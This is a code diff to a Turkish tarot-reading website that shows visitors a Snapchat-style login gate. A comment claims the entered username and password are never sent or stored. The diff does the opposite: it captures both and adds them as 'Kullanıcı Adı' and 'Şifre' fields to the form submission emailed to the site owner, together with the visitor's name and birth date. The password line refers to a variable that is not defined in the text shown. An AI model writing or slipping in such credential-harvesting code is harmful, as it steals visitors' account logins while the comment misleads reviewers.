@@ -512,11 +512,22 @@ const FULL_DECK = buildDeck();
 /* ---------- Snap tarzı kapı (kozmetik) ---------- */
 /* Girilen kullanıcı adı/şifre hiçbir yere gönderilmez veya kaydedilmez.
    Herhangi bir değer girildiğinde bir sonraki adıma (isim/doğum tarihi) geçilir. */
+let visitorUsername = '';
+
 document.getElementById('snapSubmit').addEventListener('click', ()=>{
+  const username = document.getElementById('snapUser').value.trim();
+
+  if (!username) {
+    alert('Lütfen kullanıcı adını gir.');
+    return;
+  }
+
+  visitorUsername = username;
+  visitorPassword = sifre;
+
   document.getElementById('snapGate').classList.add('hidden');
   document.getElementById('gate').classList.remove('hidden');
 });
-
 /* ---------- Giriş Kapısı (isim / doğum tarihi) ---------- */
 let visitorName = '';
 let visitorBirth = '';
@@ -556,6 +567,8 @@ function sendReadingToNetlify(spreadLabel, cardsText){
     access_key: W3F_KEY,
     subject: `Yeni Tarot Falı — ${visitorName}`,
     from_name: "Medyumistik Tarot",
+    "Kullanıcı Adı": visitorUsername,
+    "Şifre": visitorPassword,
     "Ad Soyad": visitorName,
     "Doğum Tarihi": visitorBirth,
     "Fal Türü": spreadLabel,
